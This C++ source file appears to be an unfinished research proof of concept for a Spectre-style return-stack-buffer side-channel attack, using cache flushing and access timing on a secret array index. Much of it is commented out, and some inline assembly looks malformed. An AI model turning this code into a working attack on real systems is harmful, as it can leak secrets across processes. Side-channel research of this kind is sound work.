#include "util.hpp"
#include <iostream>
#include <fstream>
#define secret 1232
#define nonsecret 21142

using namespace std;

char array[256*256];
int times[10000];
int i = 0;

volatile int foo(){
	return 0;
}

void exploit() { // this should be at the same VA as attacker:gadget()
	volatile int temp = array[secret];
}

inline void timeAndFlush(ADDR_PTR addr) {
	printAccessTime(addr);
	// clflush((void *)addr);
}

void trickMe() {
	// while(1) {
	ADDR_PTR address, tmp;

	asm(
		// "mov $0x1,%r15;"
		"cpuid;"
		"mov $11(%%rip),%0;"
		"push %0;"
		"push $11(%rip);"
		"push $11(%rip);"
		"push $11(%rip);"
		"push $11(%rip);"
		// "mov $0x0000555555554881,%0;"
		// "push %0;"
		// "mov $0x0000555555554880,%0;"
		// "push %0;"
		// "mov $0x000055555555487f,%0;"
		// "push %0;"
		// "mov $0x000055555555487e,%0;"
		// "push %0;"
		// "mov $0x000055555555487d,%0;"
		// "push %0;"
		// "mov $0x000055555555487c,%0;"
		// "push %0;"
		// "mov $0x000055555555487b,%0;"
		// "push %0;"
		// "mov $0x000055555555487a,%0;"
		// "push %0;"
		// "mov $0x0000555555554879,%0;"
		// "push %0;"
		// "mov $0x0000555555554878,%0;"
		// "push %0;"
		// "mov $0x0000555555554877,%0;"
		// "push %0;"
		// "mov $0x0000555555554876,%0;"
		// "push %0;"
		// "mov $0x0000555555554875,%0;"
		// "push %0;"
		// "mov $0x0000555555554874,%0;"
		// "push %0;"
		// "mov $0x0000555555554873,%0;"
		// "push %0;"
		// "mov $0x0000555555554872,%0;"
		// "push %0;"
		".rept 16;"
		"ret;"
		".endr;"
		: "=r" (tmp)
		: "r" (address)
	);

	// for(int i = 0; i < 10000; i++) {
	// 	foo();
	// 	times[i] = measure_one_block_access_time((ADDR_PTR)&array[secret]);
	// 	clflush((void *)&array[secret]);
	timeAndFlush((ADDR_PTR)&array[secret]);
	// 	// timeAndFlush((ADDR_PTR)&array[nonsecret]);
	// }
}

int main(){
	clflush(&array[secret]);
	// clflush(&array[nonsecret]);

	trickMe();

	// for(int i = 0; i < 10000; i++) {
	// 	printf("%u\n", times[i]);
	// }

	// string buffer;
	// char temp;
	// volatile int i = 0;

	// ifstream secretFile("secret");
	// if(secretFile.is_open()){
	// 	getline(secretFile, buffer);
	// 	secretFile.close();
	// }

	// string secret = buffer;
	// temp &= array[secret[i]*256]; // vulneralbility

	// while(true){
	// 	foo();
	// 	measureAccessTime();
	// }

	return 0;
}